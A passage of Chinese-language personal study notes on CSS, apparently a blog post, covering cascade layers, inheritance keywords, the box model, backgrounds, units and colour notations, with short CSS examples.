‘）和调整优先级的选择器（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:where"><code>:where()</code></a>）不会影响优先级。</p><p><strong>内联样式优先于所有的普通样式</strong>（优先级可理解为1-0-0-0）。</p><p><strong>!important</strong>：一个特殊的css，可以覆盖上面所有的优先级计算。（谨慎使用，两个!important优先级的情况下，顺序靠后的优先）</p><h4 id="层叠层（级联层、cascade-layers）"><a href="#层叠层（级联层、cascade-layers）" class="headerlink" title="层叠层（级联层、cascade layers）"></a>层叠层（级联层、cascade layers）</h4><p>三种创建方法：</p><ul><li><code>@layer</code>声明at规则，后跟一个或多个层的名称来声明层。</li><li><code>@layer</code>块at规则，块中所有样式都将添加到一个命名或未命名的层中</li><li>使用具有<code>layer</code>关键字或者<code>layer()</code>函数的@import规则。将导入文件的内容分配到该层中。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 文件：layers1.css */</span><br><br><span class="hljs-comment">/* 未分层的样式 */</span><br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br><span class="hljs-comment">/* 创建第一个层：`layout` */</span><br><span class="hljs-keyword">@layer</span> layout &#123;<br>  <span class="hljs-selector-tag">main</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>  &#125;<br>&#125;<br><span class="hljs-comment">/* 创建第二个层：一个未命名的匿名层 */</span><br><span class="hljs-keyword">@layer</span> &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">/* 创建第三和第四个层：`theme` 和 `utilities` */</span><br><span class="hljs-keyword">@layer</span> theme，layout，utilities；<br>/* 向已经存在的 `layout` 层添加样式 */<br>@layer layout &#123;<br>  <span class="hljs-selector-tag">main</span> &#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#000</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">/* 创建第五个层：一个未命名的匿名层 */</span><br><span class="hljs-keyword">@layer</span> &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">1vw</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>@import规则允许用户直接从其他样式表导入样式规则到css文件或<code>&lt;style&gt;</code>元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;components-lib.css&quot;</span>) layer(components);<br><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;dialog.css&quot;</span>) layer(components.dialog);<br><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;marketing.css&quot;</span>) layer();<br><span class="hljs-keyword">@import</span> url(comments.css) layer(social);<br><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;ruby-narrow.css&quot;</span>) layer(international) supports(<span class="hljs-attribute">display</span>: ruby) <span class="hljs-keyword">and</span><br>  (<span class="hljs-attribute">width</span> &lt; <span class="hljs-number">32rem</span>);<br><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;ruby-wide.css&quot;</span>) layer(international) supports(<span class="hljs-attribute">display</span>: ruby) <span class="hljs-keyword">and</span><br>  (<span class="hljs-attribute">width</span> &gt;= <span class="hljs-number">32rem</span>);<br></code></pre></td></tr></table></figure><h4 id="嵌套层（nested-cascade-layers）"><a href="#嵌套层（nested-cascade-layers）" class="headerlink" title="嵌套层（nested cascade layers）"></a>嵌套层（nested cascade layers）</h4><p>Nested layers 是 layers within a named（有命名的层） or an anonymous(匿名层)的子层.</p><p> 每个层叠层（即使是匿名的）都可以包含嵌套层。导入到另一个层中的层会成为该层中的嵌套层。</p><p><strong>优点</strong>：不用担心一些layer的冲突（例如不同团队导入它们到一个层中，或是外部内部样式表会有冲突的层名称）。同样，嵌套使你可以将第三方样式表导入到一个层中，而不用担心该样式表本身是否具有层。</p><p><strong>创建</strong>：可以用和layer相同的方法创建。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;components-lib.css&quot;</span>) layer(components);<br><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;narrowtheme.css&quot;</span>) layer(components.narrow);<br></code></pre></td></tr></table></figure><blockquote><p>在第一行中，我们将 <code>components-lib.css</code> 导入 <code>components</code> 层。如果该文件包含任何层，无论命名与否，这些层都会成为 <code>components</code> 层中的嵌套层。</p><p>第二行将 <code>narrowtheme.css</code> 导入 <code>narrow</code> 层，<code>narrow</code> 是 <code>components</code> 的子层。嵌套的 <code>components.narrow</code> 会作为 <code>components</code> 层中的最后一个层创建，除非 <code>components-lib.css</code> 已经包含一个 <code>narrow</code> 层，在这种情况下，<code>narrowtheme.css</code> 的内容会被附加到 <code>components.narrow</code> 嵌套层。可以使用 <code>components.&lt;layerName&gt;</code> 模式向 <code>components</code> 层添加更多命名嵌套层。如前所述，可以创建未命名层，但随后无法访问它们。</p></blockquote><p><strong>总结</strong>：</p><ul><li>层的优先权顺序是创建层的顺序。</li><li>一旦创建，就无法更改层顺序。</li><li>普通样式的层优先权是创建层的顺序。</li><li>未分层普通样式优先于有层普通样式。</li><li>重要样式的层优先权被反转，早期创建的层具有优先权。</li><li>所有有层的重要样式都优先于未分层的重要（和普通）样式。</li><li>普通内联样式优先于所有普通样式，无论是否分层。</li><li>重要内联样式优先于所有其他样式，正在过渡的样式除外。</li><li>作者样式无法覆盖重要内联样式（过渡除外，但这是临时的）。</li></ul><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><u><strong>一些</strong></u>父元素上的css属性是可以被子元素继承的，有些则不能。</p><h4 id="控制继承"><a href="#控制继承" class="headerlink" title="控制继承"></a>控制继承</h4><p>css为控制继承提供了五个特殊的**通用属性<u>值</u>**。</p><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/inherit"><code>inherit</code></a></p><p>​    设置该属性会使子元素属性和父元素相同。（“开启继承”）</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/initial"><code>initial</code></a></p><p>​    将应用于选定元素的属性值设置为该属性的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/initial_value">初始值</a>。  </p></li><li><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/revert"><code>revert</code> (en-US)</a></p><p>​    将应用于选定元素的属性值重置为浏览器的默认样式，而不是应用于该属性的默认值。在许多情况下，此值的作用类似于 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/unset"><code>unset</code></a>。  </p></li><li><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/revert-layer"><code>revert-layer</code> (en-US)</a></p><p>​    将应用于选定元素的属性值重置为在上一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@layer">层叠层</a>中建立的值。  </p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/unset"><code>unset</code></a></p><p>​    将属性重置为自然值，也就是如果属性是自然继承那么就是 <code>inherit</code>，否则和 <code>initial</code> 一样</p></li></ul><h4 id="重设所有属性值"><a href="#重设所有属性值" class="headerlink" title="重设所有属性值"></a>重设所有属性值</h4><p>CSS 的简写属性 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/all"><code>all</code></a> 可以用于同时将这些继承值中的一个应用于（几乎）所有属性。它的值可以是其中任意一个（<code>inherit</code>、<code>initial</code>、<code>unset</code> 或 <code>revert</code>）。</p><p>这是一种撤销对样式所做更改的简便方法，以便回到之前已知的起点。</p><h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><p>对盒子的display属性进行设置，inline或者block，来控制盒子的外部显示类型。</p><p><strong>display的常见值</strong>：</p><ul><li>block：该元素生成一个块级元素盒。该元素之前和之后产生换行。</li><li>inline：该元素生成一个或多个内联元素盒，它们之前或者之后并不会产生换行。</li><li>flow：该元素使用流式布局（块和内联布局）来排布它的内容。</li><li>inline-block：该元素生成块级元素盒，如果它是一个单独的内联盒，它将和周围的内容一起流动（行为类似于替换元素）。推开元素，但不换行。</li></ul><h3 id="块级盒子（Block-box）"><a href="#块级盒子（Block-box）" class="headerlink" title="块级盒子（Block box）"></a>块级盒子（Block box）</h3><p>Block盒子的<strong>表现</strong>：</p><ul><li>盒子会在内联的方向上扩展并占据父容器在该方向上的所有可用空间。在绝大数情况下意味着盒子会和父容器一样宽。</li><li>每个盒子都<u>会换行</u></li><li><code>width</code>和<code>height</code>属性可以发挥作用</li><li>内边距（padding）, 外边距（margin）和 边框（border）会将其他元素从当前盒子周围“推开”</li></ul><p>除非特殊指定，诸如标题 (<code>&lt;h1&gt;</code>等) 和段落 (<code>&lt;p&gt;</code>) 默认情况下都是块级的盒子。</p><h3 id="内联盒子（Inline-box"><a href="#内联盒子（Inline-box" class="headerlink" title="内联盒子（Inline box)"></a>内联盒子（Inline box)</h3><p>inline盒子的表现：</p><ul><li>盒子<u>不会产生换行</u>。</li><li><code>width</code>和<code>height</code>属性将不起作用。</li><li>垂直方向的内边距、外边距以及边框会被应用但是不会把其他处于 <code>inline</code> 状态的盒子推开。</li><li>水平方向的内边距、外边距以及边框会被应用且会把其他处于 <code>inline</code> 状态的盒子推开。</li></ul><p>用做链接的 <code>&lt;a&gt;</code> 元素、 <code>&lt;span&gt;</code>、 <code>&lt;em&gt;</code> 以及 <code>&lt;strong&gt;</code> 都是默认处于 <code>inline</code> 状态的。</p><h3 id="盒模型的各个部分"><a href="#盒模型的各个部分" class="headerlink" title="盒模型的各个部分"></a>盒模型的各个部分</h3><p>完成的css盒模型引用于块级盒子（内联盒子只能使用盒模型定义中的部分内容）。</p><p><strong>组成：</strong></p><ul><li><strong>Content box</strong>：显示内容。大小通过<code>width</code>,<code>height</code>设置</li><li><strong>Padding box</strong>：包围在content区域外部的空白区域。大小通过<code>padding</code>相关属性设置</li><li><strong>Border box</strong>：包裹内容(content)和内边距(padding)。大小通过<code>border</code>相关属性设置</li><li><strong>Margin box</strong>：最外面的区域（外边距），盒子与其他元素之间的空白区域。大小通过<code>margin</code>相关属性设置。</li></ul><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-18%20%E4%B8%8A%E5%8D%881.38.11.png" alt="盒子模型，来源：https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/The_box_model"></p><p><strong>标准盒模型（默认）：content+padding+border</strong>。（<code>box-sizing: content-box</code>）</p><ul><li>box-sizing属性定义了 user agent 应该如何计算一个元素的总宽度和总高度。<ul><li>content-box是默认值。</li><li>border-box告诉浏览器 边框和内边距都包含在width内。（也就是不含margin）</li></ul></li></ul><p><strong>替代(IE)盒模型</strong>：所有宽度都是可见宽度（如边框，填充)。使用<code>box-sizing: border-box</code>来进行设置。</p><h3 id="外边距margin"><a href="#外边距margin" class="headerlink" title="外边距margin"></a>外边距margin</h3><p>外边距是盒子周围一圈看不到的空间。它会把其他元素从盒子旁边推开。</p><p>外边距的属性值可设置为负数。</p><p><strong>外边距折叠</strong>：两个外边距相接的元素，外边距合并为一个外边距，大小为<u>最大的单个外边距的大小</u>。</p><ul><li><strong><code>margin-block</code></strong> 定义了元素的逻辑块首和块末外边距，并根据元素的书写模式、行内方向和文本朝向对应至实体外边距。<ul><li>简写属性，包含了margin-block-start、margin-block-end</li></ul></li></ul><h3 id="边框border"><a href="#边框border" class="headerlink" title="边框border"></a>边框border</h3><p>margin和padding之间绘制的，叫做边框。</p><p>以下为3个常见属性：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-width"><code>border-width</code></a> 宽度</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-style"><code>border-style</code></a> 样式<ul><li>none：无</li><li>dotted：点</li><li>solid：实体</li><li>inset：内陷效果</li></ul></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-color"><code>border-color</code></a> 颜色</li></ul><p>其他：</p><ul><li><strong><code>border-collapse</code></strong> ：属性是用来决定表格的边框是分开的还是合并的。<ul><li>collapse：合并模式。表格中相邻单元格共享边框。<ul><li>在这种模式下，CSS 属性border-style 的值 inset 表现为槽，值 outset 表现为脊。</li></ul></li><li>separate：分隔膜式（html表格的传统模式）。相邻单元格都拥有不同的边框。边框之间的距离是通过 CSS 属性 border-spacing 来确定的。</li></ul></li></ul><h3 id="内边距-padding"><a href="#内边距-padding" class="headerlink" title="内边距 padding"></a>内边距 padding</h3><p>border和content之间。</p><p>与margin不同，值不能为负数，必须为0或整数。</p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><h3 id="背景-background"><a href="#背景-background" class="headerlink" title="背景 background*"></a>背景 background*</h3><ul><li><p>-color：颜色。</p></li><li><p>-image：背景<strong>图片</strong>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.a</span>&#123; <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">a.jpg</span>);&#125;<br></code></pre></td></tr></table></figure><p>可存在多个图片。图片的相互重叠时，越先列出的图片层越高，最后列出的图片垫底。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">image1.png</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">image2.png</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">image3.png</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">image4.png</span>);<br></code></pre></td></tr></table></figure></li><li><p>-repeat：控制图像<strong>平铺</strong>。</p><ul><li><code>no-repeat</code>——不平铺</li><li><code>repeate-x</code>——仅水平方向平铺</li><li><code>repeat-y</code>——仅垂直方向平铺</li><li><code>repeat</code>——默认值，x、y两个方向平铺</li></ul></li><li><p>-size：控制背景<strong>图像大小</strong>。</p><p>可使用关键字控制：</p><ul><li><code>cover</code>:覆盖盒子（占满盒子区域），保持宽高比。（有可能部分区域会超出盒子）</li><li><code>contain</code>:适应框内大小，若长宽比与盒子不同，盒子内的图片边缘可能会出现空隙。</li></ul></li><li><p>-positon：图像定位(x,y)。默认左上角为(0,0)</p><p><code>background-position</code> 是 background-position-x<code>和</code>background-position-y&#96;的简写，它们允许用户分别设置不同的坐标轴的值。</p><p>有关键字，例如正中间<code>center</code>，顶&#x2F;底部正中间<code>top/bottom</code>，左&#x2F;右边正中间<code>left/right</code>。</p><p>也可以用百分比表示。</p></li><li><p>渐变背景：**<code>&lt;gradient&gt;</code>**</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/*线性渐变*/</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">#f69d3c</span>, <span class="hljs-number">#3f87a6</span>);<br><span class="hljs-comment">/*径向渐变*/</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<span class="hljs-number">#f69d3c</span>, <span class="hljs-number">#3f87a6</span>);<br><span class="hljs-comment">/*重复渐变*/</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">repeating-linear-gradient</span>(<span class="hljs-number">#f69d3c</span>, <span class="hljs-number">#3f87a6</span> <span class="hljs-number">50px</span>);<br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">repeating-radial-gradient</span>(<span class="hljs-number">#f69d3c</span>, <span class="hljs-number">#3f87a6</span> <span class="hljs-number">50px</span>);<br><span class="hljs-comment">/*锥形渐变*/</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(<span class="hljs-number">#f69d3c</span>, <span class="hljs-number">#3f87a6</span>);<br></code></pre></td></tr></table></figure></li><li><p>-attachment：背景附加。指定内容滚动时的滚动方式。</p><p><a href="https://mdn.github.io/learning-area/css/styling-boxes/backgrounds/background-attachment.html">示例</a></p><ul><li><code>scroll</code>：使元素的背景在页面滚动时滚动。如果滚动了元素内容，则背景不会移动。实际上，背景被固定在页面的相同位置，所以它会<strong>随着页面的滚动而滚动</strong>。</li><li><code>fixed</code>：使元素的背景固定在视口上，这样<strong>当页面或元素内容滚动时，它就不会滚动</strong>。它将始终保持在屏幕上相同的位置。</li><li><code>local</code>：将背景固定在它所设置的元素上，所以当你<strong>滚动该元素时，背景也随之滚动</strong>。</li></ul></li></ul><h3 id="不透明度-opacity"><a href="#不透明度-opacity" class="headerlink" title="不透明度 opacity"></a>不透明度 opacity</h3><p>指定了元素的不透明度，值为number类型，取0.0到1.0范围内的数值。</p><p><strong>0为完全透明。</strong></p><p><strong>1为完全不透明。</strong></p><h3 id="边框-border"><a href="#边框-border" class="headerlink" title="边框 border*"></a>边框 border*</h3><ul><li>-radius：圆角</li><li>-style：边框样式。</li></ul><h3 id="书写模式-writing-mode"><a href="#书写模式-writing-mode" class="headerlink" title="书写模式 writing-mode"></a>书写模式 writing-mode</h3><p>**书写模式<code>writing-mode</code>**：控制文本排列方式是纵向还是横向。</p><p>书写模式有三个值：</p><ul><li><code>horizontal-tb</code>: 块流向从上至下。文本方向是横向的。</li><li><code>vertical-rl</code>: 块流向从右向左。文本方向是纵向的。</li><li><code>vertical-lr</code>: 块流向从左向右。文本方向是纵向的。</li></ul><p>横向书写模式下，映射到<code>width</code>的属性被称作内联尺寸（<code>inline-size</code>），映射到height的属性被称作块级尺寸（<code>block-size</code>）。</p><p>同样，在逻辑值上也有映射，例如<code>block-start</code>、<code>inline-end</code>、<code>block-end</code>和<code>inline-start</code>。</p><h3 id="溢出控制-Overflow"><a href="#溢出控制-Overflow" class="headerlink" title="溢出控制 Overflow"></a>溢出控制 Overflow</h3><p>当我们往盒子里塞了太多东西，就有可能发生<strong>溢出</strong>。</p><p>overflow属性是一个控制元素溢出的方式。用它告诉浏览器如何处理溢出。</p><ul><li>visible：overflow的默认值。</li><li>hidden：溢出隐藏。</li><li>scroll：溢出时增加滚动条。<ul><li>可设置滚动条方向。例如<code>overflow-y: scroll</code>指仅在y轴方向滚动。</li></ul></li></ul><h3 id="值-amp-单位"><a href="#值-amp-单位" class="headerlink" title="值&amp;单位"></a>值&amp;单位</h3><p>数值类型表：</p><table><thead><tr><th>数值类型</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;integer&gt;</code></td><td><code>&lt;integer&gt;</code> 是一个整数，比如 <code>1024</code> 或 <code>-55</code>。</td></tr><tr><td><code>&lt;number&gt;</code></td><td><code>&lt;number&gt;</code> 表示一个小数——它可能有小数点后面的部分，也可能没有，例如 <code>0.255</code>、<code>128</code> 或 <code>-1.2</code>。</td></tr><tr><td><code>&lt;dimension&gt;</code></td><td><code>&lt;dimension&gt;</code> 是一个 <code>&lt;number&gt;</code> 它有一个附加的单位，例如 <code>45deg</code>、<code>5s</code> 或 <code>10px</code>。<code>&lt;dimension&gt;</code> 是一个伞形类别，包括        <code>&lt;length&gt;</code>、<code>&lt;angle&gt;</code>、<code>&lt;time&gt;</code> 和 <code>&lt;resolution&gt;</code>  类型。</td></tr><tr><td><code>&lt;percentage&gt;</code></td><td><code>&lt;percentage&gt;</code> 表示一些其他值的一部分，例如 <code>50%</code>。百分比值总是相对于另一个量。例如，一个元素的长度相对于其父元素的长度。</td></tr></tbody></table><p><strong>绝对长度单位</strong>：</p><table><thead><tr><th>单位</th><th>名称</th><th>等价换算</th></tr></thead><tbody><tr><td><code>cm</code></td><td>厘米</td><td>1cm &#x3D; 37.8px &#x3D; 25.2&#x2F;64in</td></tr><tr><td><code>mm</code></td><td>毫米</td><td>1mm &#x3D; 1&#x2F;10th of 1cm</td></tr><tr><td><code>Q</code></td><td>四分之一毫米</td><td>1Q &#x3D; 1&#x2F;40th of 1cm</td></tr><tr><td><code>in</code></td><td>英寸</td><td>1in &#x3D; 2.54cm &#x3D; 96px</td></tr><tr><td><code>pc</code></td><td>派卡</td><td>1pc &#x3D; 1&#x2F;6th of 1in</td></tr><tr><td><code>pt</code></td><td>点</td><td>1pt &#x3D; 1&#x2F;72th of 1in</td></tr><tr><td><strong><code>px</code></strong></td><td><strong>像素</strong></td><td>1px &#x3D; 1&#x2F;96th of 1in</td></tr></tbody></table><p><strong>相对长度单位</strong>：</p><table><thead><tr><th>单位</th><th>相对于</th></tr></thead><tbody><tr><td><strong><code>em</code></strong></td><td><strong>在 <code>font-size</code> 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 <code>width</code>。</strong></td></tr><tr><td><code>ex</code></td><td>字符“x”的高度。</td></tr><tr><td><code>ch</code></td><td>数字“0”的宽度。</td></tr><tr><td><strong><code>rem</code></strong></td><td><strong>根元素的字体大小。</strong></td></tr><tr><td><code>lh</code></td><td>元素的行高。</td></tr><tr><td><code>rlh</code></td><td>根元素的行高。当用于根元素的 <code>font-size</code> 或 <code>line-height</code> 属性时，它指的是这些属性的初始值。</td></tr><tr><td><strong><code>vw</code></strong></td><td><strong>视口宽度的 1%。</strong></td></tr><tr><td><strong><code>vh</code></strong></td><td><strong>视口高度的 1%。</strong></td></tr><tr><td><code>vmin</code></td><td>视口较小尺寸的 1%。</td></tr><tr><td><code>vmax</code></td><td>视口大尺寸的 1%。</td></tr><tr><td><code>vb</code></td><td>在根元素的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_logical_properties_and_values#%E5%9D%97%E5%90%91%E4%B8%8E%E8%A1%8C%E5%90%91">块向</a>上，初始包含块的尺寸的 1%。</td></tr><tr><td><code>vi</code></td><td>在根元素的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_logical_properties_and_values#%E5%9D%97%E5%90%91%E4%B8%8E%E8%A1%8C%E5%90%91">行向</a>上，初始包含块的尺寸的 1%。</td></tr><tr><td><code>svw</code>、<code>svh</code></td><td>分别为<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/length#%E5%9F%BA%E4%BA%8E%E8%A7%86%E5%8F%A3%E7%9A%84%E7%9B%B8%E5%AF%B9%E9%95%BF%E5%BA%A6%E5%8D%95%E4%BD%8D">视口较小尺寸</a>的宽度和高度的 1%。</td></tr><tr><td><code>lvw</code>、<code>lvh</code></td><td>分别为<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/length#%E5%9F%BA%E4%BA%8E%E8%A7%86%E5%8F%A3%E7%9A%84%E7%9B%B8%E5%AF%B9%E9%95%BF%E5%BA%A6%E5%8D%95%E4%BD%8D">视口大尺寸</a>的宽度和高度的 1%。</td></tr><tr><td><code>dvw</code>、<code>dvh</code></td><td>分别为<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/length#%E5%9F%BA%E4%BA%8E%E8%A7%86%E5%8F%A3%E7%9A%84%E7%9B%B8%E5%AF%B9%E9%95%BF%E5%BA%A6%E5%8D%95%E4%BD%8D">动态视口</a>的宽度和高度的 1%。</td></tr></tbody></table><p>视口(viewport)单位：vh、vw。</p><p>最常遇到的相对长度：em、rem。</p><ul><li><strong>em</strong>意为<strong>父元素</strong>的字体大小。例如在<code>&lt;ul&gt;</code>内的<code>&lt;li&gt;</code>元素设置为1.3em，则每嵌套一层，里面的字体都会是其父字体的1.3倍（看上去像是不断变大）。</li><li><strong>rem</strong>意为<strong>根元素</strong>的字体大小。也就是从根元素获取大小（也就不会在连续的嵌套层里不断变大）。</li></ul><p><strong><u>百分比</u>是相较于其他值设置的</strong>。例如字体设置为百分比作为宽度值，它的宽度值将会是父元素宽度的百分比值。</p><h3 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h3><p>现代计算机的标准颜色系统是 24 位的，它允许通过不同的红、绿、蓝通道的组合显示，每个通道有256个不同的值（256 x 256 x 256 &#x3D; 16,777,216）。</p><p>css中的几种颜色指定方法。</p><ol><li><p><strong>颜色关键词</strong></p><p>如：white、blueviolet、greenyellow等。</p></li><li><p><strong>十六进制RGB值</strong></p><p>由一个#和六个十六进制数字组成。每对值对应一个通道（红绿蓝）。</p><p>如：</p><div style="background-color: #02798b;">#02798b</div><div style="background-color: #c55da1;">#c55da1</div><div style="background-color: #128a7d;">#128a7d</div></li><li><p><strong>rgb() 和 rgba()</strong> </p><p>前三位表示红蓝绿通道（和前一种方法类似），第四位表示颜色的<strong>alpha通道</strong>，用于控制不透明度。</p><p>旧版css中，rgb()不支持alpha通道。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">rgb(<span class="hljs-number">2</span> <span class="hljs-number">121</span> <span class="hljs-number">139</span>);<br>rgb(<span class="hljs-number">197</span> <span class="hljs-number">93</span> <span class="hljs-number">161</span> / .<span class="hljs-number">7</span>);<br></code></pre></td></tr></table></figure><p>原色、间色、复色：</p><ul><li><p>原色</p><ul><li>红：rgb(255,0,0)</li><li>绿：rgb(0,255,0)</li><li>蓝：rgb(0,0,255)</li></ul></li><li><p>间色</p><ul><li>黄：rgb(255,255,0)</li><li>青：rgb(0,255,255)</li><li>品红：rgb(255,0,255)</li></ul></li><li><p>复色：通过组合一种原色和一种邻近的间色来创建。</p><ul><li>橙（红+黄）：rgb(255,127,0)</li><li>亮绿（绿+青）：rgb(0,255,127)</li><li>蓝紫（品红+蓝）：rgb(127,0,255)</li><li>黄绿（绿+黄）：rgb(127, 255, 0)</li><li>天蓝（蓝+青）：rgb(0, 127, 255);</li><li>玫瑰（红+品红）：rgb(255, 0, 127);</li></ul></li><li><p>黑白</p><ul><li>黑：rgb(0,0,0)</li><li>白：rgb(255,255,255)</li></ul></li><li><p>补色：色轮上相互对立的两种颜色</p><p> 例如：rgb(255, 0, 0) 和 rgb(0, 255, 255)。</p></li><li></li></ul></li><li><p><strong>HSL和HSLA</strong></p><p>HSL颜色模型。</p><p>不再是红绿蓝值，而是色相、饱和度和亮度值。</p><p>它同样可以使用alpha参数指定透明值。</p><ul><li><strong>色相</strong>：颜色的底色。0-360。</li><li><strong>饱和度</strong>：0-100%。0为无颜色（显示为灰色），100%为全色饱和度。</li><li><strong>亮度</strong>：0-100%。0为无光（显示为黑），100%表示全亮（显示为白色）。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">hsl(<span class="hljs-number">188</span>, <span class="hljs-number">97%</span>, <span class="hljs-number">28%</span>)<br></code></pre></td></tr></table></figure></li></ol><h3 id="min-和-max-尺寸"><a href="#min-和-max-尺寸" class="headerlink" title="min- 和 max- 尺寸"></a>min- 和 max- 尺寸</h3><p>可以让css给元素一个最大或最小尺寸。</p><p>例如<code>max-height</code>,<code>max-width</code>.</p><p>这个技术让图片<strong>可响应</strong>，当在更小的设备上浏览时，它们会适合的缩放。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><p>box-shadow：元素周围应用一个或多个阴影</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">box-shadow</span>: offsetX offsetY blurRadius spreadRadius color;<br></code></pre></td></tr></table></figure><ul><li>正 <code>offsetX</code> 值将阴影向右移动，负值将它向左移动</li><li>正 <code>offsetY</code> 值将阴影向下移动，负值将它向上移动</li><li><code>blurRadius</code>：阴影模糊半径。默认为0。</li><li><code>spreadRadius</code>：阴影扩散半径。默认为0。</li></ul></li><li><p>filter：模糊或颜色偏移等图形效果</p><ul><li><code>blur()</code>模糊</li></ul></li><li><p>transform：元素旋转、缩放、倾斜、平移。</p><ul><li><code>rotate()</code>旋转</li></ul></li><li><p>scroll-behavior：为一个滚动框指定滚动行为</p><ul><li>auto：立即滚动</li><li>smooth：平稳滑动</li></ul></li><li><p>accesskey : （全局属性）为当前元素生成快捷键。属性值必须包含一个可打印字符。</p></li><li><p>aria-hidden：可以用来控制一系列可访问 API 中的非交互内容的<strong>显示或隐藏</strong>。</p><ul><li><blockquote><p>把 <code>aria-hidden=&quot;true&quot;</code> 